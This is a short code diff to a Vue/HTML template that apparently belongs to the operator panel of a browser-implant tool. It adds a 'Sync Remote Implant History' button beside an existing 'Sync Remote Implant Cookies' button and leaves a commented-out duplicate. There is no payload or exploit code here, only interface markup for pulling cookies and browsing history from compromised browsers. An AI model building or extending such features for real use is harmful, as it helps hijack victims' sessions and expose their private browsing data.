@@ -65,6 +65,18 @@
                         v-on:click="sync_cookies_to_browser">
                         <i class="fas fa-sync"></i> Sync Remote Implant Cookies
                     </button>
+                    <button type="button" class="btn btn-block btn-primary" v-if="!config.sync_button_disabled"
+                        v-on:click="sync_history_to_browser">
+                        <i class="fas fa-sync"></i> Sync Remote Implant History
+                    </button>
+                    <!-- <button type="button" class="btn btn-block btn-primary" v-if="!config.sync_button_disabled"
+                        v-on:click="sync_cookies_to_browser">
+                        <i class="fas fa-sync"></i> Sync Remote Implant Cookies
+                    </button>
+                    <button type="button" class="btn btn-block btn-primary" v-if="!config.sync_button_disabled"
+                        v-on:click="sync_cookies_to_browser">
+                        <i class="fas fa-sync"></i> Sync Remote Implant Cookies
+                    </button> -->
                 </div>
             </div>
         </div>
